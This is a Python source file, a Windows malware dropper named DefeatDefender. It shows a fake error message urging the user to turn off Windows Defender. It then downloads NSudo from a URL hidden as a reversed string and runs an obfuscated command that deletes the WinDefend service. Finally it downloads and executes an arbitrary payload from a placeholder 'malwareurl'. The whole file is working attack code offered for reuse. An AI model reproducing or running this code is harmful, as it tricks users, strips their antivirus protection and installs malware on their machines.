from fileinput import filename
import requests
import subprocess
import ctypes
import os
import psutil
import sys
from time import sleep
class DefeatDefender:
    def __init__(self):
        self.url = "exe.oduSN/niam/noitcetorP-repmaT-ssapyB/anrakgaws/moc.tnetnocresubuhtig.war//:sptth"[::-1]
        self.dll_handle = ctypes.WinDLL("User32.dll")
        self.k_handle = ctypes.WinDLL("Kernel32.dll")
        self.service = None
        self.isrunning = False

        # Setting Up The Params
        #global hWnd,lpText,lpCaption,uType
        self.hWnd = None
        self.lpCaption = 'Error Occured'
        self.lpText = 'Windows Defender has blocked some of our Features.Please Turn off Windows Defender and run again'
        self.uType = 0x00000010
        
    

    def check(self):
         global response
         response = self.dll_handle.MessageBoxW(self.hWnd, self.lpText, self.lpCaption, self.uType)
         
        # Check For Errors 
         error = self.k_handle.GetLastError()
         if error != 0:
            print("Error Code: {0}".format(error))
            exit(1)
    def checkservice(self):
        
        try:
            sleep(2.5)
            service = psutil.win_service_get('WdNisSvc')
            service = service.as_dict()
            for i in service:
                if(service[i]=='running'):
                    print("Please Turn off your Windows Defender")
                    self.isrunning = True
                else:
                    pass            
        except Exception as ex:
            # raise psutil.NoSuchProcess if no service with such name exists
            print(str(ex))
    def shutservice(self):
       
        uname = os.getlogin() 
        Path = f"C:\\Users\\{uname}\\AppData\\Local\\Temp"
        
        os.chdir(Path)
        nsudo = requests.get(self.url,allow_redirects=True)
        open('Nsudo.exe','wb').write(nsudo.content)
        sleep(5)
        Fullpath = Path +"\\Nsudo.exe"
        print(Fullpath)
        if(os.path.exists(Fullpath)):
              malix = "dnefedniw  eteled cs  ediH:edoMwodniWwohS- T:U- odusN"[::-1]
              subprocess.Popen(malix,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
              sleep(3.2)
              malname = "youfilename.exe" # your filename must include .exe in the end
              malwareurl = "https://your-url-here/" #change this
              print(malwareurl)
              malware = requests.get(malwareurl, allow_redirects=True)

              open(malname, 'wb').write(malware.content)
              subprocess.Popen(malname,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
              
        
        else:
             print("file not present")     
             sys.exit(0)
    
if __name__ == "__main__":
    ddf = DefeatDefender()
    ddf.checkservice()
    
    if(ddf.isrunning==True):
        while True:
        
            ddf.check()
            if response == 1:
             print("Clicked OK!")
            
            sys.exit(0)
            break  
    else:
        print("Defender is already turned off") 
        ddf.shutservice()
        
